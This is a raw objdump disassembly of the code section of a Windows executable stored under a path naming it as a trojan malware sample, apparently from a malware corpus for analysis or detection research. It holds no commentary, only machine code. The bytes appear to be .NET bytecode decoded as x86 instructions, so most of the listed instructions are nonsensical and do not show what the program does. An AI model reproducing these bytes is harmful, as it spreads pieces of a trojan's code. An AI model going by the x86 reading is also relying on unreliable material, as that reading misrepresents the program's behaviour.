
malware_samples/trojan/569e92c7cc6e42da0add10344fb885150fce32b683128454f74a2c7692d02122.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 d1                	add    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 d0                	add    %dl,%al
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
